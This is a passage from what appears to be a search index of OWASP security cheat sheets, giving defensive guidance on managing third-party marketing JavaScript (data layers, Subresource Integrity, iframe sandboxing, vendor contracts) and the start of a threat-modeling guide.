marketing analysis. An example statement for a corporate standard document is 'The tag JavaScript can only access values in the host data layer. The tag JavaScript can never access a URL parameter. You the host page developer have to agree with the third-party vendors or the tag manager what attribute in the data layer will have what value so they can create the JavaScript to read that value. User interface tags cannot be made secure using the data layer architecture because their function (or one of their functions) is to change the user interface on the client, not to send data about the user actions. Analytics tags can be made secure using the data layer architecture because the only action needed is to send data from the data layer to the third party. Only first party code is executed; first to populate the data layer (generally on page load); then event handler JavaScript sends whatever data is needed from that page to the third party database or tag manager. This is also a very scaleable solution. Large ecommerce sites can easily have hundreds of thousands of URL and parameter combinations, with different sets of URLs and parameters being included in different marketing analysis campaigns. The marketing logic could have 30 or 40 different vendor tags on a single page. For example user actions in pages about specified cities, from specified locations on specified days should send data layer elements 1, 2 and 3. User actions in pages about other cities should send data layer elements 2 and 3 only. Since the event handler code to send data layer data on each page is controlled by the host developers or marketing technologists using the tag manager developer interface, the business logic about when and what data layer elements are sent to the tag manager server, can be changed and deployed in minutes. No interaction is needed with the third parties; they continue getting the data they expect but now it comes from different contexts that the host marketing technologists have chosen. Changing third party vendors just means changing the data dissemination rules at the tag manager server, no changes are needed in the host code. The data also goes directly only to the tag manager so the execution is fast. The event handler JavaScript does not have to connect to multiple third party sites. Indirect Requests \u00b6 For indirect requests to tag manager/aggregator sites that offer the GUI to configure the javascript, they may also implement: Technical controls such as only allowing the JavaScript to access the data layer values, no other DOM element Restricting the tag types deployed on a host site, e.g. disabling of custom HTML tags and JavaScript code The host company should also verify the security practices of the tag manager site such as access controls to the tag configuration for the host company. It also can be two-factor authentication. Letting the marketing folks decide where to get the data they want can result in XSS because they may get it from a URL parameter and put it into a variable that is in a scriptable location on the page. Sandboxing Content \u00b6 Both of these tools be used by sites to sandbox/clean DOM data. DOMPurify is a fast, tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure default, but offers a lot of configurability and hooks. MentalJS is a JavaScript parser and sandbox. It whitelists JavaScript code by adding a \"$\" suffix to variables and accessors. Subresource Integrity \u00b6 Subresource Integrity will ensure that only the code that has been reviewed is executed. The developer generates integrity metadata for the vendor javascript, and adds it to the script element like this: < script src = \"https://analytics.vendor.com/v1.1/script.js\" integrity = \"sha384-MBO5IDfYaE6c6Aao94oZrIOiC7CGiSNE64QUbHNPhzk8Xhm0djE6QqTpL0HzTUxk\" crossorigin = \"anonymous\" > < /script> It is important to know that in order for SRI to work, the vendor host needs CORS enabled. Also it is good idea to monitor vendor JavaScript for changes in regular way. Because sometimes you can get secure but not working third-party code when the vendor decides to update it. Keeping JavaScript libraries updated \u00b6 OWASP Top 10 2013 A9 describes the problem of using components with known vulnerabilities. This includes JavaScript libraries. JavaScript libraries must be kept up to date, as previous version can have known vulnerabilities which can lead to the site typically being vulnerable to Cross Site Scripting . There are several tools out there that can help identify such libraries. One such tool is the free open source tool RetireJS Sandboxing with iframe \u00b6 You can also put vendor JavaScript into an iframe from different domain (e.g. static data host). It will work as a \"jail\" and vendor JavaScript will not have direct access to the host page DOM and cookies. The host main page and sandbox iframe can communicate between each other via the postMessage mechanism . Also, iframes can be secured with the iframe sandbox attribute . For high risk applications, consider the use of Content Security Policy (CSP) in addition to iframe sandboxing. CSP makes hardening against XSS even stronger. <!-- Some host, e.g. somehost.com, HTML code here --> < html > < head ></ head > < body > ... <!-- Include iframe with 3rd party vendor javascript --> < iframe src = \"https://somehost-static.net/analytics.html\" sandbox = \"allow-same-origin allow-scripts\" > </ iframe > </ body > </ html > <!-- somehost-static.net/analytics.html --> < html > < head ></ head > < body > ... < script > window . addEventListener ( \"message\" , receiveMessage , false ); function receiveMessage ( event ) { if ( event . origin !== \"https://somehost.com:443\" ) { return ; } else { // Make some DOM here and initialize other //data required for 3rd party code } } </ script > <!-- 3rd party vendor javascript --> < script src = \"https://analytics.vendor.com/v1.1/script.js\" ></ script > <!-- /3rd party vendor javascript --> </ body > </ html > Virtual iframe Containment \u00b6 This technique creates iFrames that run asynchronously in relation to the main page. It also provides its own containment JavaScript that automates the dynamic implementation of the protected iFrames based on the marketing tag requirements. Vendor Agreements \u00b6 You can have the agreement or request for proposal with the 3rd parties require evidence that they have implemented secure coding and general corporate server access security. But in particular you need to determine the monitoring and control of their source code in order to prevent and detect malicious changes to that JavaScript. MarTechSec \u00b6 Marketing Technology Security This refers to all aspects of reducing the risk from marketing JavaScript. Controls include Contractual controls for risk reduction; the contracts with any MarTech company should include a requirement to show evidence of code security and code integrity monitoring. Contractual controls for risk transference: the contracts with any MarTech company could include a penalty for serving malicious JavaScript Technical controls for malicious JavaScript execution prevention; Virtual Iframes, Technical controls for malicious JavaScript identification; Subresource Integrity . Technical controls including client side JavaScript malicious behavior in penetration testing requirements. MarSecOps \u00b6 Marketing Security Operations This refers to the operational requirements to maintain some of the technical controls. This involves possible cooperation and information exchange between the marketing team, the martech provider and the run or operations team to update the information in the page controls (SRI hash change, changes in pages with SRI), the policies in the Virtual iFrames, tag manager configuration, data layer changes etc. The most complete and preventive controls for any site containing non-trivial marketing tags are - A data layer that calls the marketing server or tag manager APIs , so that only your code executes on your page (inversion of control). Subresource Integrity . Virtual frame Containment. The MarSecOps requirements to implement technical controls at the speed of change that marketing wants or without a significant number of dedicated resources, can make data layer and Subresource Integrity controls impractical. References \u00b6 Widespread XSS Vulnerabilities in Ad Network Code Affecting Top Tier Publishers, Retailers . Inside and Beyond Ticketmaster: The Many Breaches of Magecart . Magecart \u2013 a malicious infrastructure for stealing payment details from online shops . Compromised E-commerce Sites Lead to \"Magecart\" Inbenta, blamed for Ticketmaster breach, admits it was hacked .","title":"Third Party Javascript Management"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#third-party-javascript-management-cheat-sheet","text":"","title":"Third Party JavaScript Management Cheat Sheet"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#introduction","text":"Tags, aka marketing tags, analytics tags etc. are small bits of JavaScript on a web page. They can also be HTML image elements when JavaScript is disabled. The reason for them is to collect data on the web user actions and browsing context for use by the web page owner in marketing. Third party vendor JavaScript tags (hereinafter, tags ) can be divided into two types: User interface tags. Analytic tags. User interface tags have to execute on the client because they change the DOM; displaying a dialog or image or changing text etc. Analytics tags send information back to a marketing information database; information like what user action was just taken, browser metadata, location information, page metadata etc. The rationale for analytics tags is to provide data from the user's browser DOM to the vendor for some form of marketing analysis. This data can be anything available in the DOM. The data is used for user navigation and clickstream analysis, identification of the user to determine further content to display etc., and various marketing analysis functions. The term host refers to the original site the user goes to, such as a shopping or news site, that contains or retrieves and executes third party JavaScript tag for marketing analysis of the user actions.","title":"Introduction"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#major-risks","text":"The single greatest risk is a compromise of the third party JavaScript server, and the injection of malicious JavaScript into the original tag JavaScript. This has happened in 2018 and likely earlier. The invocation of third-party JS code in a web application requires consideration for 3 risks in particular: The loss of control over changes to the client application, The execution of arbitrary code on client systems, The disclosure or leakage of sensitive information to 3rd parties.","title":"Major risks"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#risk-1-loss-of-control-over-changes-to-the-client-application","text":"This risk arises from the fact that there is usually no guaranty that the code hosted at the third-party will remain the same as seen from the developers and testers: new features may be pushed in the third-party code at any time, thus potentially breaking the interface or data-flows and exposing the availability of your application to its users/customers. Typical defenses include, but are not restricted to: in-house script mirroring (to prevent alterations by 3rd parties), sub-resource integrity (to enable browser-level interception) and secure transmission of the third-party code (to prevent modifications while in-transit). See below for more details.","title":"Risk 1: Loss of control over changes to the client application"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#risk-2-execution-of-arbitrary-code-on-client-systems","text":"This risk arises from the fact that third-party JavaScript code is rarely reviewed by the invoking party prior to its integration into a website/application. As the client reaches the hosting website/application, this third-party code gets executed, thus granting the third-party the exact same privileges that were granted to the user (similar to XSS attacks ). Any testing performed prior to entering production loses some of its validity, including AST testing ( IAST , RAST , SAST , DAST , etc.). While it is widely accepted that the probability of having rogue code intentionally injected by the third-party is low, there are still cases of malicious injections in third-party code after the organization's servers were compromised (ex: Yahoo, January 2014). This risk should therefore still be evaluated, in particular when the third-party does not show any documentation that it is enforcing better security measures than the invoking organization itself, or at least equivalent. Another example is that the domain hosting the third-party JavaScript code expires because the company maintaining it is bankrupt or the developers have abandoned the project. A malicious actor can then re-register the domain and publish malicious code. Typical defenses include, but are not restricted to: In-house script mirroring (to prevent alterations by 3rd parties), Sub-resource integrity (to enable browser-level interception), Secure transmission of the third-party code (to prevent modifications while in-transit) and various types of sandboxing. See below for more details. ...","title":"Risk 2: Execution of arbitrary code on client systems"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#risk-3-disclosure-of-sensitive-information-to-3rd-parties","text":"When a third-party script is invoked in a website/application, the browser directly contacts the third-party servers. By default, the request includes all regular HTTP headers. In addition to the originating IP address of the browser, the third-party also obtains other data such as the referrer (in non-https requests) and any cookies previously set by the 3rd party, for example when visiting another organization's website that also invokes the third-party script. In many cases, this grants the third-party primary access to information on the organization's users / customers / clients. Additionally, if the third-party is sharing the script with other entities, it also collects secondary data from all the other entities, thus knowing who the organization's visitors are but also what other organizations they interact with. A typical case is the current situation with major news/press sites that invoke third-party code (typically for ad engines, statistics and JavaScript APIs): any user visiting any of these websites also informs the 3rd parties of the visit. In many cases, the third-party also gets to know what news articles each individual user is clicking specifically (leakage occurs through the HTTP referrer field) and thus can establish deeper personality profiles. Typical defenses include, but are not restricted to: in-house script mirroring (to prevent leakage of HTTP requests to 3rd parties). Users can reduce their profiling by random clicking links on leaking websites/applications (such as press/news websites) to reduce profiling. See below for more details.","title":"Risk 3: Disclosure of sensitive information to 3rd parties"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#third-party-javascript-deployment-architectures","text":"There are three basic deployment mechanisms for tags . These mechanisms can be combined with each other.","title":"Third-party JavaScript Deployment Architectures"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#vendor-javascript-on-page","text":"This is where the vendor provides the host with the JavaScript and the host puts it on the host page. To be secure the host company must review the code for any vulnerabilities like XSS attacks or malicious actions such as sending sensitive data from the DOM to a malicious site. This is often difficult because the JavaScript is commonly obfuscated. <!-- Some host, e.g. foobar.com, HTML code here --> < html > < head ></ head > < body > ... < script type = \"text/javascript\" > /* 3rd party vendor javascript here */ </ script > </ body > </ html >","title":"Vendor JavaScript on page"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#javascript-request-to-vendor","text":"This is where one or a few lines of code on the host page each request a JavaScript file or URL directly from the vendor site. When the host page is being created, the developer includes the lines of code provided by the vendor that will request the vendor JavaScript. Each time the page is accessed the requests are made to the vendor site for the javascript, which then executes on the user browser. <!-- Some host, e.g. foobar.com, HTML code here --> ` < html > < head ></ head > < body > ... <!-- 3rd party vendor javascript --> < script src = \"https://analytics.vendor.com/v1.1/script.js\" ></ script > <!-- /3rd party vendor javascript --> </ body > </ html >","title":"JavaScript Request to Vendor"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#indirect-request-to-vendor-through-tag-manager","text":"This is where one or a few lines of code on the host page each request a JavaScript file or URL from a tag aggregator or tag manager site; not from the JavaScript vendor site. The tag aggregator or tag manager site returns whatever third party JavaScript files that the host company has configured to be returned. Each file or URL request to the tag manager site can return lots of other JavaScript files from multiple vendors. The actual content that is returned from the aggregator or manager (i.e. the specific JavaScript files as well as exactly what they do) can be dynamically changed by host site employees using a graphical user interface for development, hosted on the tag manager site that non-technical users can work with, such as the marketing part of the business. The changes can be either: Get a different JavaScript file from the third-party vendor for the same request. Change what DOM object data is read, and when, to send to the vendor. The tag manager developer user interface will generate code that does what the marketing functionality requires, basically determining what data to get from the browser DOM and when to get it. The tag manager always returns a container JavaScript file to the browser which is basically a set of JavaScript functions that are used by the code generated by the user interface to implement the required functionality. Similar to java frameworks that provide functions and global data to the developer, the container JavaScript executes on the browser and lets the business user use the tag manager developer user interface to specify high level functionality without needing to know JavaScript. <!-- Some host, e.g. foobar.com, HTML code here --> < html > < head ></ head > < body > ... <!-- Tag Manager --> < script >( function ( w , d , s , l , i ){ w [ l ] = w [ l ] || []; w [ l ]. push ({ 'tm.start' : new Date (). getTime (), event : 'tm.js' }); var f = d . getElementsByTagName ( s )[ 0 ], j = d . createElement ( s ), dl = l != 'dataLayer' ? '&l=' + l : '' ; j . async = true ; j . src = 'https://tagmanager.com/tm.js?id=' + i + dl ; f . parentNode . insertBefore ( j , f ); })( window , document , 'script' , 'dataLayer' , 'TM-FOOBARID' );</ script > <!-- /Tag Manager --> </ body > </ html > `","title":"Indirect request to Vendor through Tag Manager"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#security-problems-with-requesting-tags","text":"The previously described mechanisms are difficult to make secure because you can only see the code if you proxy the requests or if you get access to the GUI and see what is configured. The JavaScript is generally obfuscated so even seeing it is usually not useful. It is also instantly deployable because each new page request from a browser executes the requests to the aggregator which gets the JavaScript from the third party vendor. So as soon as any JavaScript files are changed on the vendor, or modified on the aggregator, the next call for them from any browser will get the changed JavaScript. One way to manage this risk is with the Subresource Integrity standard described below.","title":"Security Problems with requesting Tags"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#server-direct-data-layer","text":"The tag manager developer user interface can be used to create JavaScript that can get data from anywhere in the browser DOM and store it anywhere on the page. This can allow vulnerabilities because the interface can be used to generate code to get unvalidated data from the DOM (e.g. URL parameters) and store it in some page location that would execute JavaScript. The best way to make the generated code secure is to confine it to getting DOM data from a host defined data layer. The data layer is either: a DIV object with attribute values that have the marketing or user behavior data that the third-party wants a set of JSON objects with the same data. Each variable or attribute contains the value of some DOM element or the description of a user action. The data layer is the complete set of values that all vendors need for that page. The data layer is created by the host developers. When specific events happen that the business has defined, a JavaScript handler for that event sends values from the data layer directly to the tag manager server. The tag manager server then sends the data to whatever third party or parties is supposed to get it. The event handler code is created by the host developers using the tag manager developer user interface. The event handler code is loaded from the tag manager servers on every page load. This is a secure technique because only your JavaScript executes on your users browser, and only the data you decide on is sent to the vendor. This requires cooperation between the host, the aggregator or tag manager and the vendors. The host developers have to work with the vendor in order to know what type of data the vendor needs to do their analysis. Then the host programmer determines what DOM element will have that data. The host developers have to work with the tag manager or aggregator to agree on the protocol to send the data to the aggregator: what URL, parameters, format etc. The tag manager or aggregator has to work with the vendor to agree on the protocol to send the data to the vendor: what URL, parameters, format etc. Does the vendor have an API?","title":"Server Direct Data Layer"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#security-defense-considerations","text":"","title":"Security Defense Considerations"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#server-direct-data-layer_1","text":"The server direct mechanism is a good security standard for third party JavaScript management, deployment and execution. A good practice for the host page is to create a data layer of DOM objects. The data layer can perform any validation of the values, especially values from DOM objects exposed to the user like URL parameters and input fields, if these are required for the marketing analysis. An example statement for a corporate standard document is 'The tag JavaScript can only access values in the host data layer. The tag JavaScript can never access a URL parameter. You the host page developer have to agree with the third-party vendors or the tag manager what attribute in the data layer will have what value so they can create the JavaScript to read that value. User interface tags cannot be made secure using the data layer architecture because their function (or one of their functions) is to change the user interface on the client, not to send data about the user actions. Analytics tags can be made secure using the data layer architecture because the only action needed is to send data from the data layer to the third party. Only first party code is executed; first to populate the data layer (generally on page load); then event handler JavaScript sends whatever data is needed from that page to the third party database or tag manager. This is also a very scaleable solution. Large ecommerce sites can easily have hundreds of thousands of URL and parameter combinations, with different sets of URLs and parameters being included in different marketing analysis campaigns. The marketing logic could have 30 or 40 different vendor tags on a single page. For example user actions in pages about specified cities, from specified locations on specified days should send data layer elements 1, 2 and 3. User actions in pages about other cities should send data layer elements 2 and 3 only. Since the event handler code to send data layer data on each page is controlled by the host developers or marketing technologists using the tag manager developer interface, the business logic about when and what data layer elements are sent to the tag manager server, can be changed and deployed in minutes. No interaction is needed with the third parties; they continue getting the data they expect but now it comes from different contexts that the host marketing technologists have chosen. Changing third party vendors just means changing the data dissemination rules at the tag manager server, no changes are needed in the host code. The data also goes directly only to the tag manager so the execution is fast. The event handler JavaScript does not have to connect to multiple third party sites.","title":"Server Direct Data Layer"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#indirect-requests","text":"For indirect requests to tag manager/aggregator sites that offer the GUI to configure the javascript, they may also implement: Technical controls such as only allowing the JavaScript to access the data layer values, no other DOM element Restricting the tag types deployed on a host site, e.g. disabling of custom HTML tags and JavaScript code The host company should also verify the security practices of the tag manager site such as access controls to the tag configuration for the host company. It also can be two-factor authentication. Letting the marketing folks decide where to get the data they want can result in XSS because they may get it from a URL parameter and put it into a variable that is in a scriptable location on the page.","title":"Indirect Requests"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#sandboxing-content","text":"Both of these tools be used by sites to sandbox/clean DOM data. DOMPurify is a fast, tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure default, but offers a lot of configurability and hooks. MentalJS is a JavaScript parser and sandbox. It whitelists JavaScript code by adding a \"$\" suffix to variables and accessors.","title":"Sandboxing Content"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#subresource-integrity","text":"Subresource Integrity will ensure that only the code that has been reviewed is executed. The developer generates integrity metadata for the vendor javascript, and adds it to the script element like this: < script src = \"https://analytics.vendor.com/v1.1/script.js\" integrity = \"sha384-MBO5IDfYaE6c6Aao94oZrIOiC7CGiSNE64QUbHNPhzk8Xhm0djE6QqTpL0HzTUxk\" crossorigin = \"anonymous\" > < /script> It is important to know that in order for SRI to work, the vendor host needs CORS enabled. Also it is good idea to monitor vendor JavaScript for changes in regular way. Because sometimes you can get secure but not working third-party code when the vendor decides to update it.","title":"Subresource Integrity"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#keeping-javascript-libraries-updated","text":"OWASP Top 10 2013 A9 describes the problem of using components with known vulnerabilities. This includes JavaScript libraries. JavaScript libraries must be kept up to date, as previous version can have known vulnerabilities which can lead to the site typically being vulnerable to Cross Site Scripting . There are several tools out there that can help identify such libraries. One such tool is the free open source tool RetireJS","title":"Keeping JavaScript libraries updated"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#sandboxing-with-iframe","text":"You can also put vendor JavaScript into an iframe from different domain (e.g. static data host). It will work as a \"jail\" and vendor JavaScript will not have direct access to the host page DOM and cookies. The host main page and sandbox iframe can communicate between each other via the postMessage mechanism . Also, iframes can be secured with the iframe sandbox attribute . For high risk applications, consider the use of Content Security Policy (CSP) in addition to iframe sandboxing. CSP makes hardening against XSS even stronger. <!-- Some host, e.g. somehost.com, HTML code here --> < html > < head ></ head > < body > ... <!-- Include iframe with 3rd party vendor javascript --> < iframe src = \"https://somehost-static.net/analytics.html\" sandbox = \"allow-same-origin allow-scripts\" > </ iframe > </ body > </ html > <!-- somehost-static.net/analytics.html --> < html > < head ></ head > < body > ... < script > window . addEventListener ( \"message\" , receiveMessage , false ); function receiveMessage ( event ) { if ( event . origin !== \"https://somehost.com:443\" ) { return ; } else { // Make some DOM here and initialize other //data required for 3rd party code } } </ script > <!-- 3rd party vendor javascript --> < script src = \"https://analytics.vendor.com/v1.1/script.js\" ></ script > <!-- /3rd party vendor javascript --> </ body > </ html >","title":"Sandboxing with iframe"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#virtual-iframe-containment","text":"This technique creates iFrames that run asynchronously in relation to the main page. It also provides its own containment JavaScript that automates the dynamic implementation of the protected iFrames based on the marketing tag requirements.","title":"Virtual iframe Containment"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#vendor-agreements","text":"You can have the agreement or request for proposal with the 3rd parties require evidence that they have implemented secure coding and general corporate server access security. But in particular you need to determine the monitoring and control of their source code in order to prevent and detect malicious changes to that JavaScript.","title":"Vendor Agreements"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#martechsec","text":"Marketing Technology Security This refers to all aspects of reducing the risk from marketing JavaScript. Controls include Contractual controls for risk reduction; the contracts with any MarTech company should include a requirement to show evidence of code security and code integrity monitoring. Contractual controls for risk transference: the contracts with any MarTech company could include a penalty for serving malicious JavaScript Technical controls for malicious JavaScript execution prevention; Virtual Iframes, Technical controls for malicious JavaScript identification; Subresource Integrity . Technical controls including client side JavaScript malicious behavior in penetration testing requirements.","title":"MarTechSec"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#marsecops","text":"Marketing Security Operations This refers to the operational requirements to maintain some of the technical controls. This involves possible cooperation and information exchange between the marketing team, the martech provider and the run or operations team to update the information in the page controls (SRI hash change, changes in pages with SRI), the policies in the Virtual iFrames, tag manager configuration, data layer changes etc. The most complete and preventive controls for any site containing non-trivial marketing tags are - A data layer that calls the marketing server or tag manager APIs , so that only your code executes on your page (inversion of control). Subresource Integrity . Virtual frame Containment. The MarSecOps requirements to implement technical controls at the speed of change that marketing wants or without a significant number of dedicated resources, can make data layer and Subresource Integrity controls impractical.","title":"MarSecOps"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#references","text":"Widespread XSS Vulnerabilities in Ad Network Code Affecting Top Tier Publishers, Retailers . Inside and Beyond Ticketmaster: The Many Breaches of Magecart . Magecart \u2013 a malicious infrastructure for stealing payment details from online shops . Compromised E-commerce Sites Lead to \"Magecart\" Inbenta, blamed for Ticketmaster breach, admits it was hacked .","title":"References"},{"location":"cheatsheets/Threat_Modeling_Cheat_Sheet.html","text":"Threat Modeling Cheat Sheet \u00b6 Introduction \u00b6 Threat modeling is a structured approach of identifying and prioritizing potential threats to a system, and determining the value that potential mitigations would have in reducing or neutralizing those threats. This cheat sheet aims to provide guidance on how to create threat models for both existing systems or applications as well as new systems. You do not need to be a security expert in order to implement the techniques covered in this cheat sheet. All developers, software and system designers, and architects should strive to include threat modeling in their software development life cycle. Optimally, you will create your threat models and determine which mitigations are needed during an early stage of the development of a new system, application, or feature. Assessing potential threats during the design phase of your project can save significant resources that might be needed to refactor the project to include risk mitigations during a later phase of the project. When you produce a threat model, you will: Document how data flows through a system to identify where the system might be attacked. Document as many potential threats to the system as possible. Document security controls that may be put in place to reduce the likelihood or impact of a potential threat. Note that throughout the document, the terms \"systems\" and \"applications\" are used interchangeably. The principles in the document apply equally to designing and building systems such as network infrastructures or server clusters as they do to designing or developing desktop, mobile, or web applications. Threat Modeling Terminology \u00b6 You should be familiar with the following terms that will be used throughout this cheat sheet. A threat agent is an individual or group that is capable of carrying out a particular threat. It is fundamental to identify who would want to exploit the assets of a company, how they might use them against the company, and if they would be capable of doing so. Some threats require more expertise or resources, and thus raise the level of threat actor needed. For example, if a threat requires hundreds of thousands of dollars of computing power to implement, it is likely that only organized corporate, criminal, or government actors would be valid threat actors for such a threat. However, with the rise of cloud computing and the prevalence of attack software on the internet, other threats may be easy to implement with relatively little skill and few resources. Impact is a measure of the potential damage caused by a particular threat. Impact and damage can take a variety of forms. A threat may result in damage to physical assets, or may result in obvious financial loss. Indirect loss may also result from an attack, and needs to be considered as part of the impact. For example, if your company's website were defaced this could cause damage to your company's reputation, which may in turn cause a loss of business because of the loss of confidence by your users. Depending on the business you are in, attacks that expose user information could potentially result in a physical threat of harm or loss of life to your users, greatly raising the impact of threats that would allow such exposure. Likelihood is a measure of the possibility of a threat being carried out. A variety of factors can impact the likelihood of a threat being carried out, including how difficult the implementation of the threat is, and how rewarding it would be to the attacker. For example, if a threat required a skilled threat actor with tens of thousands of dollars of computing resources to implement, and the only reward was that they were able to gain access to information that is already public in some other form, the likelihood is low. However, if the threat is relatively easy to accomplish, or if the attacker were to gain valuable information from which they could profit, the likelihood may be higher. Controls are safeguards or countermeasures that you put in place in order to avoid, detect, counteract, or minimize potential threats against your information, systems, or other assets. Preventions are controls that may completely prevent a particular attack from being possible. For example, if you identify a threat that your users' personal information may be identified by certain application logging, and you decide to completely remove that logging, you have prevented that particular threat. Mitigations are controls that are put in place to reduce either the likelihood or the impact of a threat, while not necessarily completely preventing it. For example, if you store your user's passwords as hashes in a database, two users who have the same password will have the same hash. Thus, if an attacker has access to the hashed passwords and is able to determine the password associated with one hash, he is easily able to find all the other users who share the same password simply by looking for the same hash. However, if you add salts to each user's password , the cost of this particular attack is greatly increased, as the attacker must crack each password individual. An increase in cost reduces the likelihood, and thus has mitigated the attack. A data flow diagram is a depiction of how information flows through your system. It shows each place that data is input into or output from each process or subsystem. It includes anywhere that data is stored in the system, either temporarily or long-term. A trust boundary (in the context of threat modeling) is a location on the data flow diagram where data changes its level of trust. Any place where data is passed between two processes is typically a trust boundary. If your application reads a file from disk, there's a trust boundary between the application and the file because outside processes and users can modify the data in the file. If your application makes a call to a remote process, or a remote process makes calls to your application, that's a trust boundary. If you read data from a database, there's typically a trust boundary because other processes can modify the data in the database. Any place you accept user input in any form is always a trust boundary. Getting Started \u00b6 Define Business Objectives \u00b6 Before starting the threat modeling process it is important to identify business objectives of the applications you are assessing, and to identify security and compliance requirements that may be necessary due to business or government regulation. Having these objectives and requirements in mind before the threat assessment begins will help you to evaluate the impact of any threat you find during the risk analysis process. Identify application design \u00b6 Early in the threat modeling process, you will need to draw a data flow diagram of the entire system that is being assessed, including its trust boundaries. Thus, understanding the design of the application is key to performing threat modeling. Even if you are very familiar with the application design, you may identify additional data flows and trust boundaries throughout the threat modeling process. A thorough understanding of how the system is designed will also help you assess the likelihood and potential impact of any particular threat that you identify. When you are assessing an existing system that has existing design documentation, spend time reviewing that documentation. The documentation may be out of date, requiring you to gather new information to update the documentation. Or, there may be not documentation at all, requiring you to create the design documents. In the optimal case, you are performing your assessment during the design phase of the project, and the design documentation will be up-to-date and available. In any event, this cheat sheet outlines steps you can take to create design documents if they are needed. Create design documents \u00b6 There are many ways to generate design documents; the 4+1 view model is one of the matured approaches to building your design document. Reference to 4+1 view model of architecture here . Please note that the 4+1 is comprehensive, you may use any other design model during this phase. The following subsections show the details about 4+1 approach and how this could help in the threat modeling process: Logical View \u00b6 Create a logical map of the Target of Evaluation. Audience : Designers. Area : Functional Requirements: describes the design's object model. Related Artifacts : Design model Implementation View \u00b6 Audience : Programmers. Area : Software components: describes the layers and subsystems of the application. Related Artifacts : Implementation model, components Please refer to the image in the appendix section for sample design for the implementation view. Process View \u00b6 Audience : Integrators. Area : Non-functional requirements: describes the design's concurrency and synchronization aspects. Related Artifacts : (no specific artifact). Deployment View \u00b6 Create a physical map of the Target of Evaluation Audience : Deployment managers. Area : Topology: describes the mapping of the software onto the hardware and shows the system's distributed aspects. Related Artifacts : Deployment model. Use-Case View \u00b6 Audience : All the stakeholders of the system, including the end users. Area : describes the set of scenarios and/or use cases that represent some significant, central functionality of the system. Related Artifacts : Use-Case Model, Use-Case documents Decompose and Model the System \u00b6 Gain an understanding of how the system works to perform a threat model, it is important to understand how the system works and interacts with its ecosystem. To start with creating a high-level information flow diagram, like the following: Identify the trusted boundaries of your system/application/module/ecosystem that you may want to start off with. Add actors \u2013 internal and external Define internal trusted boundaries. These can be the different security zones that have been designed Relook at the actors you have identified in #2 for consistency Add information flows Identify the information elements and their classification as per your information classification policy Where possible add assets to the identified information flows. Define and Evaluate your Assets \u00b6 Assets involved in the information flow should be defined and evaluated according to their value of confidentiality, integrity and availability. Consider Data in transit and Data at rest \u00b6 Data protection in transit is the protection of this data while it\u2019s traveling from network to network or being transferred from a local storage device to a cloud storage device \u2013 wherever data is moving, effective data protection measures for in-transit data are critical as data is often considered less secure while in motion. While data at rest is sometimes considered to be less vulnerable than data in transit, attackers often find data at rest a more valuable target than data in motion. The risk profile for data in transit or data at rest depends on the security measures that are in place to secure data in either state. Protecting sensitive data both in transit and at rest is imperative for modern enterprises as attackers find increasingly innovative ways to compromise systems and steal data. Create an information flow diagram \u00b6 Whiteboard Your Architecture \u00b6 It is important to whiteboard system architecture by showing the major constraints and decisions in order to frame and start conversations. The value is actually twofold. If the architecture cannot be white-boarded, then it suggests that it is not well understood. If a clear and concise whiteboard diagram can be provided, others will understand it and it will be easier to communicate details. Manage to present your DFD in the context of MVC \u00b6 In this step, Data Flow Diagram should be divided in the context of Model, View, Controller (MVC). Use tools to draw your diagram \u00b6 If you don\u2019t like to manually draw your DFD; there are several tools available that could be used: OWASP Threat Dragon \u00b6 The OWASP Threat Dragon project is a cross platform tool that runs on Linux, macOS and Windows 10. Threat Dragon (TD) is used to create threat model diagrams and to record possible threats and decide on their mitigations using STRIDE methodology. TD is both a web application and a desktop application ; in active development with version 1.1 released in March 2020. Poirot \u00b6 The Poirot tool isolates and diagnoses defects through fault modeling and simulation. Along with a carefully selected partitioning strategy, functional and sequential test pattern applications show success with circuits having a high degree of observability. MS TMT \u00b6 The Microsoft Threat Modeling Tool (TMT) helps find threats in the design phase of software projects. It is one of the longest lived threat modeling tools, having been introduced as Microsoft SDL in 2008, and is actively supported; version 7.3 was released March 2020. It runs only on Windows 10 Anniversary Update or later, and so is difficult to use on macOS or Linux. Define Data Flow over your DFD \u00b6 Define Data Flows over the organization Data Flow Diagram. Define Trust Boundaries \u00b6 Define any distinct boundaries (External boundaries and Internal boundaries) within which a system trusts all sub-systems (including data). Define applications user roles and trust levels \u00b6 Define access rights that the application will grant to external entities and internal entities. Highlight Authorization per user role over the DFD \u00b6 Highlight Authorization per user role, for example, defining app users\u2019 role, admins\u2019 role, anonymous visitors\u2019 role...etc. Define Application Entry points \u00b6 Define the interfaces through which potential attackers can interact with the application or supply them with data. Identify Threat Agents \u00b6 Define all possible threats \u00b6 Identify Possible Attackers threat agents that could exist within the Target of Evaluation. Use Means, Motive, and Opportunities to understand Threats posed by 